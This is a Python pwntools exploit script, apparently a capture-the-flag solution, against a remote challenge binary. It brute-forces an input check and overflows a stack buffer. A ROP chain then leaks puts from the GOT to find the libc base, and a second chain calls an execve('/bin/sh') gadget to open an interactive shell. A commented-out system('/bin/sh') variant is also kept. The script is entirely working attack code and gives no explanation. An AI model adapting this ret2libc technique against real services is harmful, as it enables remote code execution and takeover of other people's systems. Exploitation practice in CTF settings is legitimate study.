from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

elf = ELF("./pwn")
rop = ROP(elf)
libc = ELF("./libc.so.6")

def overflow(*msg):
    io.sendafter("Input something: \n", flat("A" * (96 + 8), msg).ljust(0x200, b"A"))

i = 1
while True:
    log.info(f"Attempt count: {i}")
    
    io = remote("node10.anna.nssnode.cn", 28569)
    
    io.sendlineafter(b"Please input the first number: \n", b"800")

    io.sendafter(b"Please input the second number: \n", b"\x00" * 0x1f)
    result = io.recvuntil((b"Wrong.", b"Oh, you did it!"), timeout=3)
    if b"Oh, you did it!" in result:
        break
    else:
        io.close()
        i += 1

overflow(
    0x401533, elf.got["puts"],
    elf.plt["puts"],
    
    elf.symbols["vuln"]
)

io.recvuntil("Ok.")
io.recvuntil("\x0a")
puts_got = io.recv(6).ljust(8, b'\x00')
log.info(f"puts_got = {puts_got}")
libc.address = u64(puts_got) - libc.symbols["puts"]
log.info(f"libc.address = {libc.address}")

# overflow(    
#     rop.find_gadget(["ret"]).address,
    
#     0x401533, next(libc.search(b"/bin/sh\x00")),
#     libc.symbols["system"]
# )

overflow(
    0x2601f + libc.address, 0,      # pop rsi; retn
    0x119431 + libc.address, 0, 0,  # pop rdx; pop r12; retn
    0xe3b04 + libc.address          # lea rdi, aBinSh; call execve
)

io.recvuntil("Ok.")
io.recvuntil("\x0a")

io.interactive()